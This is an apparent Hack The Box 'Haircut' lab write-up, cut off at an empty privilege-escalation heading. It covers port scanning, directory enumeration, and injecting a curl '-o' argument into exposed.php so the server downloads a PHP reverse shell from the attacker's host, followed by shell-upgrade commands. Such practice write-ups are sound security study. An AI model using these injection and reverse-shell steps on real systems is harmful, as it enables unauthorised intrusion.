# Recon

As usual we start with a port scan on the target:
```
sudo nmap -sV -p- -sC -oN nmap.txt -O 10.10.10.24 -T5
```

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Haircut/assets/1.png">

The scan results only show two open ports. We'll start with the webserver on port 80.

# Enumeration
As the website itself doesn't reveal anything we'll run gobuster on the target. We will also look for files using the ```-x php,hmtml``` argument.

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Haircut/assets/2.png">

# Initial Foothold
```exposed.php``` looks interesting. It looks like it uses curl to download a given website. We can abuse this by letting it upload a reverse php shell. We download a [reverse php shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) and change the IP and port to our attacking machine which has a listener ready.

We'll upload it to the ```/uploads``` directory found with gobuster. We'll probably have right permission on that folder. ```-o``` will save the file to the location provided.

```http://10.10.14.4:8000/shell.php -o uploads/shell.php```

Browsing to ```http://10.10.14.4:8000/shell.php``` will initiate the reverse shell.

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Haircut/assets/3.png">

Like usual we'll upgrade the shell. Python was not installed but running ```which python3``` tells us that python3 is.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm

Press ctrl+z key combination 

stty raw -echo; fg
```

# Privilege Escalation



